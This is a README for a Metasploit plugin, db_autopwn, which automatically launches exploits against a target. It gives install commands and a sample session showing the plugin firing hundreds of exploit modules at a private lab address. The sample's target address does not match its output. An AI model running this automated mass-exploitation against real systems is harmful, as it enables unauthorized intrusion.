# metasploit-db_autopwn

metasploit plugin for easy exploit & vulnerability attack.<br>
But, the db_autopwn command is removed from official distribution.<br>

## Install
### 1. Clone this repo or download "db_autopwn.rb" file<br>
- clone this repository

```
#> git clone https://github.com/hahwul/metasploit-autopwn
```

<br>
or <br>
<br>

- download db_autopwn.rb file in metasploit plugin directory

```
#> wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
```

### 2. Move dB_autopwn.rb file into metasploit plugin directory

```
#> cd metasploit-autopwn
```
```
#> cp db_autopwn.rb /usr/share/metasploit-framework/plugins
```
or (install path)
```
#> cp db_autopwn.rb /opt/metasploit-framework/plugins
```

## Usage

    #> msfconsole
    MSF > load db_autopwn
    [*] Successfully loaded plugin: db_autopwn
    
    MSF > db_autopwn -p -R great -e -q 192.168.56.101 
    [-] The db_autopwn command is DEPRECATED
    [-] See http://r-7.co/xY65Zr instead
    [*] (1/1301 [0 sessions]): Launching exploit/bsdi/softcart/mercantec_softcart against 192.168.56.44:80...
    [*] (2/1301 [0 sessions]): Launching exploit/freebsd/http/watchguard_cmd_exec against 192.168.56.44:80...
    [*] (3/1301 [0 sessions]): Launching exploit/linux/antivirus/escan_password_exec against 192.168.56.44:80...
    [*] (4/1301 [0 sessions]): Launching exploit/linux/http/accellion_fta_getstatus_oauth against 192.168.56.44:80...
    [*] (5/1301 [0 sessions]): Launching exploit/linux/http/advantech_switch_bash_env_exec against 192.168.56.44:80...



